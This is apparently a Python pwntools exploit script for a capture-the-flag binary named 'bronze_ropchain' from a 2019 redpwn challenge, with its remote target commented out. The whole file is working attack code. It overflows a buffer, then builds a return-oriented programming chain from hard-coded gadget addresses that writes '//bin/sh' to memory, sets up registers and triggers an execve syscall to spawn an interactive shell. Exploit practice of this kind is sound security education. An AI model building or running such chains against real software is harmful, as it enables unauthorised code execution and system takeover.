from pwn import * 

r = process('./bronze_ropchain')
gdb.attach(r)

#r = remote('chall.2019.redpwn.net', 4004)
print r.recv()


bss = 0x080db548

# write '//bin' to memory
rop = 	'A'*28				# buffer over flow
rop +=	p32(0x0806ef2b)		# 	pop edx ; ret
rop +=	'//bi'
rop +=	p32(0x0806ef52)		#	pop ecx ; pop ebx ; ret
rop +=	p32(bss - 0xb0)		#	hex(0x080db548 - 0xb0)
rop +=	p32(0x41414141)		# 	garbage
rop += 	p32(0x080501d0)		#	mov dword ptr [ecx + 0xb0], edx ; ret


# write 'n/sh' to memory
rop +=	p32(0x0806ef2b)		# 	pop edx ; ret
rop +=	'n/sh'
rop +=	p32(0x0806ef52)		#	pop ecx ; pop ebx ; ret
rop +=	p32(bss - 0xb0 + 4)	#	hex(0x080db548 - 0xb0 + 4)
rop +=	p32(0x41414141)		# 	garbage
rop += 	p32(0x080501d0)		#	mov dword ptr [ecx + 0xb0], edx ; ret


# reset ecx
rop += 	p32(0x080499f3)		#	xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
rop +=	p32(0x41414141)
rop +=	p32(0x41414141)
rop +=	p32(0x41414141)
rop +=	p32(0x41414141)


# reset edx
rop += 	p32(0x0805c823)		#	 xor edx, edx ; pop ebx ; mov eax, edx ; pop esi ; pop edi ; ret
rop +=	p32(0x41414141)
rop +=	p32(0x41414141)
rop +=	p32(0x41414141)


# mov 11 to eax
rop +=	p32(0x080565a0)		#	xor eax, eax ; ret
for i in range(11):
	rop +=	p32(0x0807c3ba)	#	inc eax ; ret


# set '/bin/sh#' address to ebx
rop +=	p32(0x080481c9)		#	pop ebx ; ret
rop += 	p32(bss)


# call int 0x80
rop +=	p32(0x080495b3)		#	int 0x80


r.sendline(rop)
r.interactive()
